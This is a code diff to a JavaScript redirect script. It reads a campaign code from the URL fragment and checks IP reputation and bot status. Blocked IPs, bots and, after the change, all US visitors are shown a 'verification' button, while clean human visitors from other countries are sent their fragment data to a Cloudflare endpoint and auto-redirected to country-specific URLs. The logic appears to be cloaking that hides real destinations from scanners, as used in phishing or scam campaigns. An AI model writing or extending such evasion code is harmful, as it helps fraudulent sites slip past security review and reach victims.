@@ -141,12 +141,14 @@ function extractCampCode(fragmentData) {
 }
 
 // Pick the redirect URL based on country
-// - SE (Sweden)      -> se_REDIRECT_URL
-// - CH (Switzerland) -> ch_REDIRECT_URL
-// - DE (Germany)     -> de_REDIRECT_URL
-// - Anything else    -> no_REDIRECT_URL (Norway is the fallback)
+// - US (United States) -> DEFAULT_REDIRECT_URL
+// - SE (Sweden)        -> se_REDIRECT_URL
+// - CH (Switzerland)   -> ch_REDIRECT_URL
+// - DE (Germany)       -> de_REDIRECT_URL
+// - Anything else      -> no_REDIRECT_URL (Norway is the fallback)
 function getRedirectUrl() {
     const country = (userCountry || '').toUpperCase();
+    if (country === 'US') return DEFAULT_REDIRECT_URL;
     if (country === 'SE') return se_REDIRECT_URL;
     if (country === 'CH') return ch_REDIRECT_URL;
     if (country === 'DE') return de_REDIRECT_URL;
@@ -443,21 +445,24 @@ async function initApp() {
     
     const ipBlocked = ipResult.blocked;
     userCountry = ipResult.country;   // store globally for later use
+    const isUS = userCountry === 'US';
     
-    console.log(`[App] IP blocked: ${ipBlocked}, Country: ${userCountry}, isBot: ${isBot}`);
+    console.log(`[App] IP blocked: ${ipBlocked}, Country: ${userCountry}, isBot: ${isBot}, isUS: ${isUS}`);
     
     // ========== DECIDE BASED ON RESULTS ==========
-    // Rule: IP blocked OR bot -> show button.
-    //       Otherwise (clean IP AND human) -> redirect automatically.
+    // Rule:
+    //   - US visitors                 -> ALWAYS show button (click -> DEFAULT_REDIRECT_URL)
+    //   - IP blocked OR bot detected  -> show button (click -> country-based URL)
+    //   - Otherwise (clean+human+non-US) -> auto-redirect (country-based URL)
     
-    if (ipBlocked || isBot) {
+    if (isUS || ipBlocked || isBot) {
         console.log('[App] IP blocked or bot detected - showing button');
         createVerificationButton();
         return;
     }
     
-    // Clean IP + human -> auto redirect (URL picked by country, Norway fallback)
-    console.log('[App] Clean IP + human - auto-redirecting');
+    // Clean IP + human + non-US -> auto redirect (URL picked by country, Norway fallback)
+    console.log('[App] Clean IP + human + non-US - auto-redirecting');
     const userData = getFragmentData();
     await sendToCloudflareAndRedirect(userData);
 }
